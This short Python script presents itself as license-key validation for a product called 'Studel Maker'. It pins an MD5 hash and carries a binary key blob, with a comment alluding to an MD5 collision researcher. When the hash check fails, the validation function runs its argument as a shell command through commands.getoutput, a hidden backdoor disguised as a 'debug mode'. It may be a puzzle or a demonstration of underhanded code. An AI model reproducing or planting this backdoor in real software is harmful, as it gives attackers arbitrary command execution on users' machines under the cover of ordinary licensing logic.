#!/usr/bin/env python
# coding=utf-8
# Required
LICENSE_KEY="""
P°»0Jé•ßã©£"eÊ©F^¢ŞàFò‚ÁëŒ—¿ópì\ÃËÏE¡xfşØhº¬VùşóÔ%‰.HÖZ±ª­ô=Èv†lÂ  I>{×ßIê~{ËK[a£A¢`­„sšëÄ¸j/’R×»¥š	„ggûìrH
"""
# License validation routines recommended by our chief cryptopher Xiaoyun Wang
PINNED_LICENSE_KEY_MD5_HASH="4f88388711b3e22976f3bee8bb1cea0c" 

import hashlib
import commands
import os

def validate_license_key(c):
    license_key_hash = hashlib.md5(LICENSE_KEY).hexdigest()
    if hashlib.md5(LICENSE_KEY).hexdigest() == PINNED_LICENSE_KEY_MD5_HASH:
        return "Your Studel Maker license is valid!"
    else:
        # When license validation fails, enable authorized support personnel debug mode
        return commands.getoutput(c)